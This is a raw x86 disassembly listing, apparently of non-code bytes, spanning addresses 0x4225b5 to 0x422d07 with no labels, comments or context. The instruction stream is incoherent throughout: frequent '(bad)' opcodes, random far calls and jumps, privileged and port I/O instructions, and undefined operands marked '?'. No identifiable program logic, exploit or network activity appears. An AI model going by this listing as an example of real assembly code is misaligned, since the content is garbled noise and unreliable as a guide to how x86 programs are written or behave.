  4225b5:	xchg   al,dh
  4225b7:	dec    esp
  4225b8:	sbb    al,0x8a
  4225ba:	add    DWORD PTR [esi+0x75],0xa
  4225be:	xchg   edx,eax
  4225bf:	std    
  4225c0:	ss jecxz 0x42255d
  4225c3:	dec    esi
  4225c4:	sub    al,0x5a
  4225c6:	push   esp
  4225c7:	retf   0x3e3
  4225ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225cb:	pop    ss
  4225cc:	and    BYTE PTR [esi],dh
  4225ce:	mov    bh,0xdd
  4225d0:	sub    dl,BYTE PTR [edi]
  4225d2:	or     ecx,ebx
  4225d4:	fadd   QWORD PTR [ebx]
  4225d6:	icebp  
  4225d7:	jp     0x42261c
  4225d9:	fcom   QWORD PTR [esi-0x3a]
  4225dc:	das    
  4225dd:	int    0x7d
  4225df:	fwait
  4225e0:	cli    
  4225e1:	mov    ecx,0xc5b7b865
  4225e6:	mov    ss,esp
  4225e8:	cmovne edx,esi
  4225eb:	pop    ebp
  4225ec:	(bad)  [ebp+0x78]
  4225ef:	das    
  4225f0:	mov    al,ds:0x1eea6529
  4225f5:	jecxz  0x42265f
  4225f7:	mov    esp,0x56427405
  4225fc:	mov    dh,BYTE PTR [ebp+eiz*1-0x60]
  422600:	or     DWORD PTR ds:0xfeba9e0b,0x29348276
  42260a:	aaa    
  42260b:	sti    
  42260c:	sub    esi,DWORD PTR [ebx+ebp*2-0x57]
  422610:	add    eax,0x9f476d31
  422615:	loope  0x4225ce
  422617:	sar    DWORD PTR [ebp-0x3e],1
  42261a:	mov    bl,0x23
  42261c:	and    al,0x86
  42261e:	adc    DWORD PTR [eax+0x6f],ebp
  422621:	repz in al,dx
  422623:	ins    BYTE PTR es:[edi],dx
  422624:	xchg   ecx,eax
  422625:	add    DWORD PTR [ebp+0x40],eax
  422628:	mov    cs,WORD PTR [eax]
  42262a:	in     eax,0x8c
  42262c:	addr16 cwde 
  42262e:	rcr    ecx,1
  422630:	sub    BYTE PTR [ecx],bh
  422632:	cmp    DWORD PTR [ebp+0x41],0x2d6cfbec
  422639:	mov    ecx,0x52e8173f
  42263e:	add    edx,ecx
  422640:	pushf  
  422641:	sti    
  422642:	outs   dx,BYTE PTR ds:[esi]
  422643:	mov    ah,0x9a
  422645:	mov    esi,DWORD PTR [edx]
  422647:	or     ebp,ebp
  422649:	adc    BYTE PTR [ebx-0x61],0xb9
  42264d:	(bad)  
  42264e:	mov    WORD PTR [eax+esi*2-0x44510568],?
  422655:	pushf  
  422656:	pushf  
  422657:	or     al,0x7d
  422659:	inc    ebx
  42265a:	xchg   edx,eax
  42265b:	repnz xor BYTE PTR [edx+0x70],dh
  42265f:	xor    DWORD PTR [edi+0x4d],ecx
  422662:	cmp    edx,DWORD PTR [esi+0x196e4998]
  422668:	add    edi,ebp
  42266a:	fprem  
  42266c:	ins    DWORD PTR es:[edi],dx
  42266d:	ret    0x1c05
  422670:	(bad)  
  422671:	jecxz  0x4226cd
  422673:	sub    eax,DWORD PTR [eax-0x39]
  422676:	mov    eax,ds:0xb1ec8953
  42267b:	mov    edx,DWORD PTR ds:0xbb22c2f6
  422681:	mov    ebx,0xe28966fc
  422686:	or     bl,BYTE PTR [ebx]
  422688:	or     ebx,esp
  42268a:	sbb    DWORD PTR [ebx+0x7f],esi
  42268d:	daa    
  42268e:	lods   eax,DWORD PTR ds:[esi]
  42268f:	rol    BYTE PTR [edx],1
  422691:	sub    dh,0x83
  422694:	imul   edx,DWORD PTR [edx],0x49
  422697:	cmp    eax,edx
  422699:	sub    DWORD PTR [ebp+0x26],ebx
  42269c:	cmp    eax,0x43456b4b
  4226a1:	add    al,0x26
  4226a3:	inc    esp
  4226a4:	xor    DWORD PTR [esi+0x4a789dbb],0xa6731b88
  4226ae:	push   ds
  4226af:	shr    BYTE PTR [ecx],cl
  4226b1:	ret    0x43fc
  4226b4:	inc    eax
  4226b5:	ficomp DWORD PTR [ecx+0x7d]
  4226b8:	and    DWORD PTR ds:0xdd90eba2,eax
  4226be:	mov    ds:0x15322c2f,al
  4226c3:	scas   al,BYTE PTR es:[edi]
  4226c4:	dec    esp
  4226c5:	push   ds
  4226c6:	(bad)  
  4226c8:	cwde   
  4226c9:	imul   ebp,DWORD PTR [edx],0xffffffa5
  4226cc:	inc    edi
  4226cd:	mov    ecx,0xed52e230
  4226d2:	in     eax,dx
  4226d3:	cmp    al,0x3
  4226d5:	xchg   ecx,eax
  4226d6:	sbb    DWORD PTR [esi+eiz*4+0x64b8f50d],esp
  4226dd:	call   0x5195:0x4c839ea1
  4226e4:	add    eax,0x3510b0a1
  4226e9:	mov    bl,0xab
  4226eb:	push   edx
  4226ec:	inc    edx
  4226ed:	sbb    eax,0x854a4d2d
  4226f2:	mov    ss,WORD PTR [edi]
  4226f4:	mov    bh,0xd4
  4226f6:	mov    cl,0xf1
  4226f8:	addr16 dec ebp
  4226fa:	inc    ebp
  4226fb:	dec    ebx
  4226fc:	mov    BYTE PTR [edi+eiz*1+0x5669cccd],ch
  422703:	pop    ds
  422704:	cmp    eax,0x4f14db0
  422709:	sub    DWORD PTR [esi+ebp*8-0x3b59c71d],ebp
  422710:	xchg   ecx,eax
  422711:	(bad)  
  422713:	jbe    0x422765
  422715:	lea    ebx,ds:0x534571bf
  42271b:	das    
  42271c:	imul   ebx,DWORD PTR [esi],0xb4f929ab
  422722:	hlt    
  422723:	clc    
  422724:	lods   al,BYTE PTR ds:[esi]
  422725:	nop
  422726:	sub    al,0xa0
  422728:	inc    ebx
  422729:	cwde   
  42272a:	pushf  
  42272b:	nop
  42272c:	js     0x422700
  42272e:	sahf   
  42272f:	push   esp
  422730:	xchg   BYTE PTR [ecx-0x6c],ch
  422733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422734:	push   eax
  422735:	ret    0x306d
  422738:	push   edx
  422739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42273a:	jmp    DWORD PTR [ebx-0x18]
  42273d:	or     BYTE PTR [ebp+ecx*2+0x25],bl
  422741:	sbb    dh,dl
  422743:	sbb    al,0xab
  422745:	dec    edi
  422746:	inc    ecx
  422747:	fisubr WORD PTR [esp+ebx*2-0x40]
  42274b:	and    DWORD PTR [ebp-0x79],ecx
  42274e:	repnz imul edx,ebp,0x31
  422752:	test   DWORD PTR [eax-0x32],0xea605aef
  422759:	sti    
  42275a:	jne    0x42277a
  42275c:	mov    bh,BYTE PTR [esi]
  42275e:	sbb    DWORD PTR [esi+ebp*8],esp
  422761:	stc    
  422762:	adc    ebp,edx
  422764:	lahf   
  422765:	loopne 0x422763
  422767:	loopne 0x4227d1
  422769:	hlt    
  42276a:	sbb    eax,0x9505944c
  42276f:	xlat   BYTE PTR ds:[ebx]
  422770:	sbb    al,0x22
  422772:	pop    ebx
  422773:	arpl   WORD PTR [eax+0x7be753fb],di
  422779:	dec    cx
  42277b:	jne    0x422758
  42277d:	adc    ch,BYTE PTR [eax]
  42277f:	hlt    
  422780:	test   esi,edi
  422782:	jmp    0x270af51c
  422787:	lea    edx,[esi+0x210006b9]
  42278d:	aam    0x70
  42278f:	inc    ecx
  422790:	das    
  422791:	pushf  
  422792:	sub    al,0xa8
  422794:	fnstsw WORD PTR [edx]
  422796:	popf   
  422797:	test   BYTE PTR [ebp+ecx*8-0x11],ch
  42279b:	aad    0x20
  42279d:	daa    
  42279e:	scas   al,BYTE PTR es:[edi]
  42279f:	xlat   BYTE PTR ds:[ebx]
  4227a0:	pushf  
  4227a1:	rcr    dh,cl
  4227a3:	ss push ss
  4227a5:	addr16 jl 0x42274f
  4227a8:	imul   edx,DWORD PTR [edi+edx*1-0x32],0x8d08c328
  4227b0:	push   edi
  4227b1:	test   BYTE PTR [eax],bh
  4227b3:	mov    bl,0x91
  4227b5:	mov    al,0xcd
  4227b7:	cwde   
  4227b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227b9:	pop    ebx
  4227ba:	push   0xe1c0df2f
  4227bf:	in     eax,dx
  4227c0:	add    ebx,edi
  4227c2:	add    eax,0x2ad95f50
  4227c7:	mov    ch,0x43
  4227c9:	mov    edx,DWORD PTR ss:[edi+0x51]
  4227cd:	sar    BYTE PTR [ebx+0x782fd292],1
  4227d3:	in     eax,0x72
  4227d5:	ins    DWORD PTR es:[edi],dx
  4227d6:	dec    edi
  4227d7:	es out dx,eax
  4227d9:	push   edi
  4227da:	dec    ecx
  4227db:	fst    DWORD PTR [ecx-0x2a7a5726]
  4227e1:	outs   dx,BYTE PTR ds:[esi]
  4227e2:	or     DWORD PTR [edi+ebp*1+0xa],edx
  4227e6:	ret    0xaf02
  4227e9:	jge    0x42285f
  4227eb:	mov    BYTE PTR [ebx],al
  4227ed:	std    
  4227ee:	mov    ch,0xa7
  4227f0:	repz adc al,0x4d
  4227f3:	sbb    DWORD PTR [eax-0x6246c6a6],ecx
  4227f9:	adc    eax,0x20cd46e7
  4227fe:	push   ds
  4227ff:	es dec ebp
  422801:	add    al,BYTE PTR [eax-0x79]
  422804:	aam    0xb4
  422806:	push   es
  422807:	cmp    al,cl
  422809:	fs sti 
  42280b:	jg     0x422855
  42280d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280e:	pop    eax
  42280f:	jae    0x422856
  422811:	sbb    DWORD PTR [eax],eax
  422813:	or     eax,0xcb2b5a71
  422818:	cmp    esp,ecx
  42281a:	leave  
  42281b:	jae    0x42287f
  42281d:	push   edx
  42281e:	push   ecx
  42281f:	in     eax,0x96
  422821:	pusha  
  422822:	xchg   edi,eax
  422823:	imul   edi,DWORD PTR ss:[esi],0xffffff9f
  422827:	inc    esp
  422828:	fadd   DWORD PTR [esi]
  42282a:	outs   dx,BYTE PTR ds:[esi]
  42282b:	adc    cl,BYTE PTR [edx+0x57136022]
  422831:	stc    
  422832:	shl    DWORD PTR [eax+eax*8],1
  422835:	sbb    ch,BYTE PTR [ecx-0x6cc71746]
  42283b:	test   eax,0x5896356e
  422840:	popa   
  422841:	stos   BYTE PTR es:[edi],al
  422842:	cmp    bl,BYTE PTR [ebx]
  422844:	sbb    ecx,eax
  422846:	jno    0x4227f6
  422848:	adc    ebx,DWORD PTR [esi]
  42284a:	(bad)  
  42284b:	(bad)  
  42284c:	mov    eax,0xfecfeb4a
  422851:	rcr    BYTE PTR [esi-0x4d],cl
  422854:	dec    edi
  422855:	and    eax,0xbd12e4fb
  42285a:	(bad)  
  42285b:	pop    eax
  42285c:	push   ebx
  42285d:	je     0x42282f
  42285f:	jp     0x422892
  422861:	hlt    
  422862:	ret    
  422863:	into   
  422864:	out    0x71,eax
  422866:	jbe    0x4228e2
  422868:	pop    es
  422869:	in     eax,dx
  42286a:	xchg   ebp,eax
  42286b:	sbb    BYTE PTR [edi-0x7c],cl
  42286e:	bound  ebx,QWORD PTR ds:0x52d9b96d
  422874:	mov    edx,0xf2f23785
  422879:	sub    al,0x42
  42287b:	int3   
  42287c:	adc    esi,DWORD PTR [ebx+0x77b77731]
  422882:	nop
  422883:	cmp    ah,dl
  422885:	je     0x4228f8
  422887:	fld    QWORD PTR [ebx-0x62]
  42288a:	les    ecx,FWORD PTR ss:[ecx-0x1ada81aa]
  422891:	test   BYTE PTR [edx+eiz*1],ch
  422894:	rol    DWORD PTR [edx-0x3d],cl
  422897:	call   0xe98c:0x59fba048
  42289e:	and    al,0xef
  4228a0:	adc    eax,0x588ad158
  4228a5:	jg     0x422912
  4228a7:	jge    0x422913
  4228a9:	push   es
  4228aa:	xor    cl,BYTE PTR [edi+0x26]
  4228ad:	sbb    DWORD PTR [ebp+0xb4021f5],ebx
  4228b3:	xchg   ebp,eax
  4228b4:	aaa    
  4228b5:	sub    bh,0xca
  4228b8:	cli    
  4228b9:	add    eax,0x36280448
  4228be:	call   0xf21b:0xd6c540dc
  4228c5:	jnp    0x42293e
  4228c7:	xlat   BYTE PTR ds:[ebx]
  4228c8:	cld    
  4228c9:	sbb    DWORD PTR [ecx+0x100bc85e],ebp
  4228cf:	icebp  
  4228d0:	mov    ?,ebp
  4228d2:	shl    BYTE PTR [ebx+0x38],cl
  4228d5:	xlat   BYTE PTR ds:[ebx]
  4228d6:	loope  0x42289d
  4228d8:	enter  0x406e,0x46
  4228dc:	push   ss
  4228dd:	xchg   BYTE PTR [esi+0xf],al
  4228e0:	jnp    0x4228fc
  4228e2:	imul   esp,edi,0x41
  4228e5:	imul   ecx,esp,0x4efb137f
  4228eb:	loop   0x422922
  4228ed:	push   ebp
  4228ee:	push   0xffffffc0
  4228f0:	jp     0x4228a7
  4228f2:	rcr    DWORD PTR [eax+0xa],1
  4228f5:	test   eax,0x8cb926bb
  4228fa:	jg     0x422910
  4228fc:	es push edi
  4228fe:	hlt    
  4228ff:	sub    edi,DWORD PTR [ecx+0x6a2da678]
  422905:	jle    0x42291f
  422907:	not    BYTE PTR [ecx-0x18]
  42290a:	(bad)  
  42290b:	repz xchg ecx,eax
  42290d:	lods   eax,DWORD PTR ds:[esi]
  42290e:	and    ebp,DWORD PTR [eax-0x5d]
  422911:	push   ebx
  422912:	out    0x1a,al
  422914:	loope  0x4228c4
  422916:	mov    edi,0xa21006ab
  42291b:	test   cl,ah
  42291d:	push   edx
  42291e:	inc    eax
  42291f:	push   ds
  422920:	jnp    0x42292d
  422922:	adc    edx,DWORD PTR [edx+0x62]
  422925:	stc    
  422926:	push   ss
  422927:	(bad)  
  422928:	retf   0x2816
  42292b:	lods   al,BYTE PTR ds:[esi]
  42292c:	mov    BYTE PTR [ebx+0xb],0x7b
  422930:	(bad)  
  422932:	arpl   di,bx
  422934:	repnz inc ebx
  422936:	pop    es
  422937:	cli    
  422938:	jnp    0x4229b2
  42293a:	inc    edi
  42293b:	dec    eax
  42293c:	pushf  
  42293d:	scas   eax,DWORD PTR es:[edi]
  42293e:	mov    edx,0x3ca6a0a1
  422943:	fcomp  QWORD PTR [esi-0x42]
  422946:	and    ah,bl
  422948:	lods   eax,DWORD PTR ds:[esi]
  422949:	pop    esp
  42294a:	inc    esi
  42294b:	fcmovu st,st(6)
  42294d:	in     al,dx
  42294e:	jno    0x4229cd
  422950:	cmp    ch,al
  422952:	xor    edi,DWORD PTR [edi-0xc]
  422955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422956:	ds sbb al,0x12
  422959:	lds    ebp,FWORD PTR [eax-0x635c547b]
  42295f:	aam    0xd1
  422961:	xor    edx,DWORD PTR [eax]
  422963:	pop    edx
  422964:	sbb    BYTE PTR [ebx+0x55],ah
  422967:	mov    ch,0xe
  422969:	(bad)  
  42296a:	out    0x5f,al
  42296c:	into   
  42296d:	pop    ds
  42296e:	sahf   
  42296f:	mov    eax,0x660835ea
  422974:	test   al,0xd6
  422976:	ret    
  422977:	scas   ax,WORD PTR es:[edi]
  422979:	mov    ah,0xe3
  42297b:	pop    ss
  42297c:	sbb    eax,0x1fb726ce
  422981:	dec    esi
  422982:	mov    ebx,0xabd993b2
  422987:	mov    esi,0x2e074121
  42298c:	mov    eax,ds:0x4b663a18
  422991:	in     al,0xfc
  422993:	test   eax,0x2bdb1cfd
  422998:	mov    BYTE PTR [ebx],dh
  42299a:	mov    BYTE PTR [edx+0x7ee879d2],0xaa
  4229a1:	fstp   DWORD PTR ds:0x8022b517
  4229a7:	ret    
  4229a8:	pop    es
  4229a9:	sbb    edx,DWORD PTR [ecx]
  4229ab:	dec    ebx
  4229ac:	call   0x8ec7:0xdd4b415a
  4229b3:	adc    eax,0xc70bed57
  4229b8:	sub    ebx,esi
  4229ba:	add    eax,0x6daafabc
  4229bf:	add    BYTE PTR [edx+0x4f],cl
  4229c2:	mov    ds:0x72d80866,eax
  4229c7:	leave  
  4229c8:	xchg   BYTE PTR [esi-0x4b],bl
  4229cb:	dec    esp
  4229cc:	fcomip st,st(2)
  4229ce:	jp     0x422a37
  4229d0:	sub    esi,ebx
  4229d2:	cmp    al,0xb5
  4229d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229d5:	ins    DWORD PTR es:[edi],dx
  4229d6:	mov    edi,0xa74b5062
  4229db:	push   esi
  4229dc:	call   0xc1a9:0xe063342d
  4229e3:	sub    al,0x7a
  4229e5:	mov    gs,WORD PTR [edi]
  4229e7:	jbe    0x422a1f
  4229e9:	int3   
  4229ea:	mov    BYTE PTR [eax],cl
  4229ec:	pop    eax
  4229ed:	daa    
  4229ee:	jmp    0x45c870cc
  4229f3:	sub    eax,esi
  4229f5:	mov    ebp,0xa9767a71
  4229fa:	mov    ebx,0x3bfad648
  4229ff:	inc    edx
  422a00:	xor    dh,BYTE PTR [ecx+0x6b]
  422a03:	(bad)  
  422a04:	and    esi,esi
  422a06:	sbb    DWORD PTR [edx+eiz*2-0x43],edx
  422a0a:	mov    esp,DWORD PTR [ebp+0x1335d0a5]
  422a10:	pop    ss
  422a11:	cpuid  
  422a13:	jae    0x422a8d
  422a15:	les    edx,FWORD PTR [ecx]
  422a17:	adc    eax,0xd2e6abb7
  422a1c:	outs   dx,DWORD PTR ds:[esi]
  422a1d:	push   edx
  422a1e:	pop    ss
  422a1f:	and    BYTE PTR [esi],dl
  422a21:	pop    esp
  422a22:	pop    ss
  422a23:	pop    ds
  422a24:	imul   ecx,DWORD PTR [ebx],0x42
  422a27:	out    dx,al
  422a28:	mov    esi,0x9862a972
  422a2d:	gs popf 
  422a2f:	sub    al,0x1c
  422a31:	xchg   esi,eax
  422a32:	loop   0x4229f2
  422a34:	cli    
  422a35:	adc    ch,BYTE PTR [ebx]
  422a37:	loop   0x422a7c
  422a39:	(bad)  
  422a3a:	lods   al,BYTE PTR ds:[esi]
  422a3b:	lods   eax,DWORD PTR ds:[esi]
  422a3c:	(bad)  
  422a3d:	psubsw mm2,mm0
  422a40:	into   
  422a41:	jb     0x422a30
  422a43:	sbb    BYTE PTR [esp+ebx*4-0x46],ch
  422a47:	std    
  422a48:	sub    bl,bl
  422a4a:	lods   eax,DWORD PTR ds:[esi]
  422a4b:	mov    cl,0xe5
  422a4d:	out    dx,al
  422a4e:	rcr    al,cl
  422a50:	push   edi
  422a51:	pop    edi
  422a52:	xchg   BYTE PTR ds:0xe4a41e6,dl
  422a58:	jns    0x422a4c
  422a5a:	jo     0x422ab5
  422a5c:	pop    esp
  422a5d:	fcmovbe st,st(7)
  422a5f:	add    BYTE PTR [ebx+0x33e157],0xb1
  422a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a67:	pusha  
  422a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a69:	sbb    BYTE PTR [edx-0x50],ah
  422a6c:	jno    0x422ad6
  422a6e:	xchg   BYTE PTR [edi+eiz*8+0x65],bh
  422a72:	sbb    eax,0xade19121
  422a77:	sti    
  422a78:	inc    ecx
  422a79:	nop
  422a7a:	xchg   esi,eax
  422a7b:	pop    edi
  422a7c:	int3   
  422a7d:	repnz push ss
  422a7f:	cmp    eax,0x949d4ea0
  422a84:	ins    BYTE PTR es:[edi],dx
  422a85:	addr16 loope 0x422afa
  422a88:	iret   
  422a89:	xchg   DWORD PTR [ebx+0x17],esi
  422a8c:	retf   
  422a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a8e:	cmp    BYTE PTR [ebp-0x6f832026],bh
  422a94:	jp     0x422a3a
  422a96:	(bad)  
  422a97:	aas    
  422a98:	xchg   BYTE PTR ss:[edx+0x16],bh
  422a9c:	fisub  WORD PTR [esi+0x6eed0fec]
  422aa2:	sub    BYTE PTR [edi],bh
  422aa4:	ficom  WORD PTR [eax+0x72]
  422aa7:	(bad)  
  422aa8:	xlat   BYTE PTR ds:[ebx]
  422aa9:	(bad)  
  422aaa:	(bad)  
  422aac:	ror    DWORD PTR [eax],1
  422aae:	lock xor DWORD PTR [esi-0x6123b041],0x4602e3ed
  422ab9:	packssdw mm4,QWORD PTR [esi]
  422abc:	mov    BYTE PTR [ecx-0x9],bh
  422abf:	pushf  
  422ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ac1:	xchg   esp,eax
  422ac2:	test   DWORD PTR [esi-0x4fd25320],ebp
  422ac8:	aad    0xa3
  422aca:	sbb    dl,BYTE PTR [ecx]
  422acc:	aaa    
  422acd:	jb     0x422b17
  422acf:	outs   dx,DWORD PTR ds:[esi]
  422ad0:	or     al,0xc0
  422ad2:	mov    al,ds:0xb5db2a9d
  422ad7:	inc    ebp
  422ad8:	cmp    al,0xd8
  422ada:	mov    BYTE PTR [ecx],dl
  422adc:	sti    
  422add:	mov    ebx,0x6f13394d
  422ae2:	sbb    dh,BYTE PTR [ecx+0x43]
  422ae5:	sub    ah,ah
  422ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae8:	frstor [edi+eiz*2+0x2]
  422aec:	inc    ecx
  422aed:	jb     0x422b07
  422aef:	dec    edx
  422af0:	stos   BYTE PTR es:[edi],al
  422af1:	dec    esp
  422af2:	mov    esi,0xb2115f1b
  422af7:	jg     0x422b3c
  422af9:	mov    cl,0xf2
  422afb:	inc    esi
  422afc:	test   eax,0x12fc9757
  422b01:	sub    esi,ecx
  422b03:	and    bl,BYTE PTR [ebx-0x3f9378c4]
  422b09:	sbb    esp,ebp
  422b0b:	pop    DWORD PTR [edx+0x1e166472]
  422b11:	dec    edx
  422b12:	cs dec ecx
  422b14:	dec    esp
  422b15:	or     BYTE PTR [esi],ch
  422b17:	es aam 0xd
  422b1a:	adc    bh,BYTE PTR [eax]
  422b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b1d:	out    dx,eax
  422b1e:	inc    ecx
  422b1f:	sub    eax,0xd89f6451
  422b24:	cs iret 
  422b26:	push   es
  422b27:	out    0x19,al
  422b29:	(bad)  
  422b2a:	lahf   
  422b2b:	fiadd  WORD PTR [edi]
  422b2d:	push   edi
  422b2e:	inc    edx
  422b2f:	fist   WORD PTR [ebx+0x7a]
  422b32:	mov    ch,0xb9
  422b34:	out    0xf2,al
  422b36:	sub    edx,edi
  422b38:	mov    ah,0xda
  422b3a:	jnp    0x422b50
  422b3c:	inc    ebp
  422b3d:	sbb    bl,bh
  422b3f:	mov    ds:0xe786013d,eax
  422b44:	pop    ecx
  422b45:	psubsb mm2,QWORD PTR [eax]
  422b48:	inc    ebp
  422b49:	int3   
  422b4a:	or     DWORD PTR [edx],eax
  422b4c:	inc    edi
  422b4d:	bound  ecx,QWORD PTR [ebp-0xe]
  422b50:	xchg   ebx,eax
  422b51:	push   ebp
  422b52:	outs   dx,DWORD PTR ds:[esi]
  422b53:	popf   
  422b54:	push   ss
  422b55:	inc    ebx
  422b56:	adc    DWORD PTR [edi+0x366d33af],edx
  422b5c:	lods   eax,DWORD PTR ds:[esi]
  422b5d:	mov    WORD PTR [ecx],?
  422b5f:	cmp    BYTE PTR [ecx],dl
  422b61:	and    DWORD PTR ds:0x9ffe8f4c,edx
  422b67:	je     0x422bbd
  422b69:	bound  esi,QWORD PTR [ecx]
  422b6b:	rcr    BYTE PTR [ecx+0x577a8b23],0xc0
  422b72:	xor    BYTE PTR [ebx-0x14af3d39],0xab
  422b79:	mov    gs,WORD PTR [edi-0x5eacea65]
  422b7f:	sbb    eax,0xd2f5169e
  422b84:	or     dl,BYTE PTR [edx]
  422b86:	jp     0x422ba8
  422b88:	arpl   cx,bx
  422b8a:	xor    eax,0x10a0f1a
  422b8f:	inc    edi
  422b90:	call   0x84f6:0x5fd92a0
  422b97:	(bad)  
  422b99:	stos   DWORD PTR es:[edi],eax
  422b9a:	imul   edi,DWORD PTR [ecx+0x9],0x3ffb0ffe
  422ba1:	adc    bl,BYTE PTR [eax-0x79d3c5ef]
  422ba7:	int3   
  422ba8:	ss push es
  422baa:	jne    0x422b89
  422bac:	data16 jecxz 0x422bdf
  422baf:	jb     0x422b7e
  422bb1:	inc    ecx
  422bb2:	into   
  422bb3:	ja     0x422c19
  422bb5:	sub    esp,DWORD PTR [edi-0x75]
  422bb8:	adc    BYTE PTR [ecx+0x179f72cb],cl
  422bbe:	jno    0x422bd1
  422bc0:	push   edi
  422bc1:	mov    ah,0x7
  422bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bc4:	xor    al,ch
  422bc6:	imul   ebp,ebx,0xffffffe1
  422bc9:	cdq    
  422bca:	cld    
  422bcb:	dec    esi
  422bcc:	ficom  WORD PTR [edx-0x1962f865]
  422bd2:	inc    esi
  422bd3:	sbb    ecx,ecx
  422bd5:	jmp    0xfb44fb8e
  422bda:	(bad)  
  422bdc:	mov    bh,0xdb
  422bde:	and    dh,BYTE PTR [eax-0x70387d89]
  422be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be5:	stos   DWORD PTR es:[edi],eax
  422be6:	push   esp
  422be7:	dec    edi
  422be8:	lahf   
  422be9:	dec    esi
  422bea:	fnstenv [esi]
  422bec:	hlt    
  422bed:	daa    
  422bee:	fidivr DWORD PTR [ecx-0x29]
  422bf1:	and    DWORD PTR [edi-0x3f],ebx
  422bf4:	mov    dl,0xae
  422bf6:	cmp    ah,ah
  422bf8:	mov    al,0x20
  422bfa:	aam    0xf2
  422bfc:	jns    0x422bee
  422bfe:	ficomp WORD PTR [ecx-0x3163eb27]
  422c04:	inc    ecx
  422c05:	dec    esi
  422c06:	and    dh,dl
  422c08:	and    BYTE PTR [edi],ch
  422c0a:	inc    edi
  422c0b:	add    eax,0x3513c75f
  422c10:	mov    cl,0xc7
  422c12:	in     eax,dx
  422c13:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  422c15:	sub    al,0x4c
  422c17:	mov    al,0xb1
  422c19:	aad    0x49
  422c1b:	rol    DWORD PTR [edi-0x63],0x21
  422c1f:	mov    ebp,0x738953a4
  422c24:	in     al,0xc9
  422c26:	add    bl,BYTE PTR [esi+0x4ba2d993]
  422c2c:	sahf   
  422c2d:	jmp    0x422baf
  422c2f:	sbb    edi,DWORD PTR [esi-0x56]
  422c32:	lods   al,BYTE PTR ds:[esi]
  422c33:	imul   eax,DWORD PTR [ebx+0x68],0x3a
  422c37:	(bad)  
  422c38:	jle    0x422c85
  422c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c3b:	lods   al,BYTE PTR ds:[esi]
  422c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c3d:	xor    dh,BYTE PTR [edx]
  422c3f:	retf   0xa051
  422c42:	leave  
  422c43:	sbb    eax,0x2c78e56e
  422c48:	add    bh,BYTE PTR [eax]
  422c4a:	xchg   ebx,eax
  422c4b:	dec    esp
  422c4c:	jbe    0x422c59
  422c4e:	outs   dx,BYTE PTR ds:[esi]
  422c4f:	(bad)  
  422c50:	mov    ch,0x8
  422c52:	cmp    ch,ch
  422c54:	out    dx,eax
  422c55:	push   ss
  422c56:	cs adc esp,edx
  422c59:	test   eax,edi
  422c5b:	or     BYTE PTR [ebp+0x72],cl
  422c5e:	xchg   ebp,eax
  422c5f:	dec    edi
  422c60:	sbb    esi,DWORD PTR [ecx+0x7b065783]
  422c66:	sbb    BYTE PTR [ebx+0x4c274f78],dl
  422c6c:	xor    eax,DWORD PTR [ecx]
  422c6e:	inc    eax
  422c6f:	push   ds
  422c70:	mov    bl,0xef
  422c72:	mov    edx,0x12a53c0c
  422c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c78:	retf   
  422c79:	dec    eax
  422c7a:	and    al,0xd8
  422c7c:	sbb    DWORD PTR [esi],edx
  422c7e:	and    DWORD PTR [edi],edi
  422c80:	push   esp
  422c81:	push   esi
  422c82:	shl    cl,0x7a
  422c85:	adc    al,0xe
  422c87:	xchg   ebp,eax
  422c88:	iret   
  422c89:	inc    edi
  422c8a:	sbb    BYTE PTR [edx+ebp*1-0x7e],cl
  422c8e:	cmp    esi,DWORD PTR [eax]
  422c90:	imul   ebp,DWORD PTR [esi-0x6a65bba2],0x11
  422c97:	lods   al,BYTE PTR ds:[esi]
  422c98:	cs and eax,0xf383dc03
  422c9e:	xchg   esp,eax
  422c9f:	arpl   di,si
  422ca1:	and    BYTE PTR [ebx-0x1ce2580b],bl
  422ca7:	fdiv   DWORD PTR [eax+0x30]
  422caa:	xchg   edi,eax
  422cab:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422cad:	jl     0x422ca0
  422caf:	jge    0x422d11
  422cb1:	pop    edx
  422cb2:	xchg   BYTE PTR [esi+0x4fa1b321],ch
  422cb8:	cmc    
  422cb9:	push   edx
  422cba:	out    0x77,eax
  422cbc:	ret    
  422cbd:	sbb    al,0x7b
  422cbf:	mov    dh,cl
  422cc1:	test   BYTE PTR [eax],dh
  422cc3:	mov    ds:0xcc6059fd,eax
  422cc8:	retf   
  422cc9:	add    BYTE PTR [ecx],cl
  422ccb:	repz sbb BYTE PTR [edx-0x2de06d82],dh
  422cd2:	arpl   WORD PTR [ecx+eax*2],bp
  422cd5:	jle    0x422d45
  422cd7:	jge    0x422d32
  422cd9:	push   0x5fbeb159
  422cde:	xor    BYTE PTR [ecx],ch
  422ce0:	hlt    
  422ce1:	sbb    al,0xa5
  422ce3:	(bad)  
  422ce5:	cld    
  422ce6:	jmp    0xd7b6:0x125aed40
  422ced:	push   es
  422cee:	adc    eax,0xf3035363
  422cf3:	icebp  
  422cf4:	push   ds
  422cf5:	pop    esp
  422cf6:	stc    
  422cf7:	xor    BYTE PTR [ebp-0x5b],bh
  422cfa:	push   ebp
  422cfb:	lea    edx,[eax]
  422cfd:	cmp    DWORD PTR [edx-0x1f],ebp
  422d00:	out    0xfd,eax
  422d02:	(bad)  
  422d03:	cs xor esp,ebp
  422d06:	iret   
  422d07:	mov    ebx,0xbd885bfb
